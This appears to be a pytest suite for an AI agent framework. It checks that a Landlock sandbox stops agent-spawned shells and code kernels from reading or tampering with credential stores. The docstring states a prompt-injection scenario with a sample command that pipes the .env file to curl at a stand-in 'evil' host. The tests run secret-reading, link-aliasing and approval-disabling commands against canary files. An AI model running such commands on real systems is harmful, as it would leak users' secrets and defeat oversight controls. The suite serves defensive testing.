"""Agent-driven children cannot read or modify Hermes secret stores.

The credential read guard in ``agent/file_safety.py`` covers the file tools only and says
so itself: "not a security boundary; the terminal tool can still bypass". With ``terminal.backend:
local`` the agent's shell runs as the gateway's UID next to ``$HERMES_HOME/.env`` and
``auth.json``, so one obeyed prompt injection is ``cat ~/.hermes/.env | curl -d @- evil``.

Every agent-driven spawn (foreground terminal, background/PTY, execute_code kernel, cron scripts)
runs in a Landlock ruleset (Linux) that denies the secret stores and freezes the directory entries
around them, and the spawning process is marked non-dumpable so ``/proc/<pid>/environ`` and ptrace
are closed. These tests drive real spawns against a temp ``HERMES_HOME``.
"""

import ctypes
import json
import os
import shlex
import subprocess
import sys
from pathlib import Path

import pytest

from tests.tools import _child_env_fixtures
from tests.tools._child_env_fixtures import run_code

child_env = _child_env_fixtures.child_env  # fixture, requested by name below

CANARY = "sk-or-v1-canary-4f1c9e2b7a"
HELPER = Path(__file__).resolve().parents[3] / "tools" / "environments" / "landlock_exec.py"


@pytest.fixture
def hermes_home(child_env):
    home = Path(os.environ["HERMES_HOME"])
    home.mkdir(parents=True, exist_ok=True)
    (home / ".env").write_text(f"OPENROUTER_API_KEY={CANARY}\n")
    (home / "auth.json").write_text(json.dumps({"providers": {"nous": {"refresh_token": CANARY}}}))
    (home / "config.yaml").write_text("approvals:\n  mode: manual\n")
    (home / "mcp-tokens").mkdir()
    (home / "mcp-tokens" / "server.json").write_text(CANARY)
    (home / "profiles" / "work").mkdir(parents=True)
    (home / "profiles" / "work" / ".env").write_text(f"EXAMPLE_SERVICE_TOKEN={CANARY}\n")
    (home / "workspace").mkdir()
    (home / "notes.txt").write_text("hello\n")
    return home


def test_protected_paths_cover_secret_stores_and_policy_files(hermes_home):
    from agent.file_safety import terminal_protected_paths
    no_access, read_only = terminal_protected_paths()
    no_access, read_only = {Path(p) for p in no_access}, {Path(p) for p in read_only}
    home = hermes_home.resolve()
    for name in (".env", "auth.json", "auth.lock", ".anthropic_oauth.json", "webhook_subscriptions.json",
                 "auth", "mcp-tokens", "vault", "browser-profile", "pairing"):
        assert home / name in no_access, name
    assert home / "profiles" / "work" / ".env" in no_access
    assert home / "config.yaml" in read_only
    assert home / "profiles" / "work" / "config.yaml" in read_only
    assert not (no_access & read_only)


def _terminal(home):
    from tools.environments import local
    return local.LocalEnvironment(cwd=str(home / "workspace"), timeout=30)


@pytest.mark.platforms("linux")
def test_foreground_terminal_cannot_read_or_replace_secret_stores(hermes_home):
    h = shlex.quote(str(hermes_home))
    env = _terminal(hermes_home)
    try:
        reads = env.execute(
            f"cat {h}/.env; cat {h}/auth.json; cat {h}/mcp-tokens/server.json; "
            f"cat {h}/profiles/work/.env; base64 {h}/.env; "
            f"python3 -c 'import sys; print(open(sys.argv[1]).read())' {h}/.env; "
            f"cp {h}/.env {h}/workspace/copy; cat {h}/workspace/copy; true")
        assert CANARY not in reads["output"]
        tamper = env.execute(
            f"echo 'approvals: {{mode: off}}' >> {h}/config.yaml; mv {h}/.env {h}/workspace/moved; "
            f"ln {h}/.env {h}/workspace/hard; ln -s {h} {h}/workspace/alias; cat {h}/workspace/alias/.env; "
            f"rm -f {h}/auth.json; : > {h}/.env; touch {h}/new-top-level; true")
        assert CANARY not in tamper["output"]
        allowed = env.execute(
            f"ls {h} >/dev/null && cat {h}/config.yaml {h}/notes.txt && "
            f"echo ok > {h}/workspace/new.txt && cat {h}/workspace/new.txt")
        assert allowed["returncode"] == 0, allowed
        assert "mode: manual" in allowed["output"] and "hello" in allowed["output"]
        assert "ok" in allowed["output"]
    finally:
        env.cleanup()
    assert (hermes_home / ".env").read_text() == f"OPENROUTER_API_KEY={CANARY}\n"
    assert (hermes_home / "auth.json").exists()
    assert (hermes_home / "config.yaml").read_text() == "approvals:\n  mode: manual\n"
    assert not (hermes_home / "new-top-level").exists()


@pytest.mark.platforms("linux")
def test_background_process_cannot_read_secret_stores(hermes_home):
    from tools.process_registry import ProcessRegistry
    registry = ProcessRegistry()
    child = registry.spawn_local(f"cat {shlex.quote(str(hermes_home))}/.env; echo DONE",
                                 cwd=str(hermes_home / "workspace"), task_id="isolation")
    child._reader_thread.join(timeout=30)
    output = registry.read_log(child.id)["output"]
    assert "DONE" in output and CANARY not in output


@pytest.mark.platforms("linux")
def test_bare_home_without_secrets_allows_terminal_writes_at_root(child_env):
    # A HERMES_HOME holding no secrets must not be frozen, or the agent terminal
    # (and the session-snapshot bootstrap) cannot create files there. HERMES_HOME here (child_env)
    # has no .env/auth.json/config.yaml seeded.
    from tools.environments import local
    home = Path(os.environ["HERMES_HOME"])
    home.mkdir(parents=True, exist_ok=True)
    env = local.LocalEnvironment(cwd=str(home), timeout=30)
    try:
        result = env.execute(f"echo ok > {shlex.quote(str(home))}/scratch.txt && cat {shlex.quote(str(home))}/scratch.txt")
    finally:
        env.cleanup()
    assert result["returncode"] == 0, result
    assert "ok" in result["output"]
    assert (home / "scratch.txt").read_text().strip() == "ok"


@pytest.mark.platforms("linux")
def test_execute_code_kernel_cannot_read_secret_stores(hermes_home):
    path = str(hermes_home / ".env")
    code = ("import json\ntry:\n    data = open(%r).read()\nexcept PermissionError:\n    data = 'denied'\n"
            "print(json.dumps(data))" % path)
    assert run_code(code) == "denied"


@pytest.mark.platforms("linux")
def test_spawning_process_is_marked_non_dumpable(hermes_home):
    env = _terminal(hermes_home)
    try:
        env.execute("true")
    finally:
        env.cleanup()
    libc = ctypes.CDLL(None, use_errno=True)
    assert libc.prctl(3, 0, 0, 0, 0) == 0  # PR_GET_DUMPABLE: /proc/<pid>/environ + ptrace closed


@pytest.mark.platforms("linux")
def test_helper_refuses_a_secret_file_with_a_hard_link_alias(hermes_home, tmp_path):
    os.link(hermes_home / ".env", tmp_path / "alias")
    result = subprocess.run(
        [sys.executable, "-I", "-S", str(HELPER), "--mode", "require",
         "--no-access", str(hermes_home / ".env"), "--", "cat", str(tmp_path / "alias")],
        capture_output=True, text=True, timeout=30)
    assert result.returncode == 126 and CANARY not in result.stdout
    assert "hard link" in result.stderr


@pytest.mark.platforms("macos", "windows")
def test_helper_fails_closed_without_landlock_in_require_mode(tmp_path):
    marker = tmp_path / "ran"
    base = [sys.executable, "-I", "-S", str(HELPER)]
    cmd = ["--", sys.executable, "-c", f"open({str(marker)!r}, 'w').close()"]
    refused = subprocess.run([*base, "--mode", "require", *cmd], capture_output=True, text=True, timeout=30)
    assert refused.returncode == 126 and "Landlock" in refused.stderr and not marker.exists()
    allowed = subprocess.run([*base, "--mode", "auto", *cmd], capture_output=True, text=True, timeout=30)
    assert allowed.returncode == 0 and marker.exists()


@pytest.mark.platforms("macos")
def test_default_mode_off_linux_runs_unwrapped_with_a_warning(caplog):
    from tools.environments import secret_isolation
    secret_isolation._WARNED.clear()
    assert secret_isolation.wrap_argv(["bash", "-c", "true"]) == ["bash", "-c", "true"]
    assert "terminal secret isolation" in caplog.text


@pytest.mark.parametrize("raw,expected", [
    (None, "auto"), ("require", "require"), ("auto", "auto"), ("off", "off"), (False, "off"),
    (True, "require"), ("bogus", "require")])
def test_mode_defaults_to_auto_and_unknown_values_fail_closed(monkeypatch, raw, expected):
    from tools.environments import secret_isolation
    security = {} if raw is None else {"terminal_secret_isolation": raw}
    monkeypatch.setattr(secret_isolation, "_security_config", lambda: security)
    assert secret_isolation.isolation_mode() == expected


def test_unreadable_config_fails_closed_to_require(monkeypatch):
    from hermes_cli import config
    from tools.environments import secret_isolation

    def _broken():
        raise OSError("config.yaml unreadable")
    monkeypatch.setattr(config, "load_config_readonly", _broken)
    assert secret_isolation.isolation_mode() == "require"


def test_auto_mode_without_landlock_warns_once(monkeypatch, caplog):
    from tools.environments import landlock_exec, secret_isolation
    monkeypatch.setattr(sys, "platform", "linux")
    monkeypatch.setattr(secret_isolation, "isolation_mode", lambda: "auto")
    monkeypatch.setattr(secret_isolation, "_harden_parent", lambda: None)
    monkeypatch.setattr(landlock_exec, "abi_version", lambda libc=None: 0)
    monkeypatch.setattr(secret_isolation, "_WARNED", set())
    for _ in range(3):
        secret_isolation.wrap_argv(["bash", "-c", "true"])
    assert caplog.text.count("Landlock is unavailable") == 1
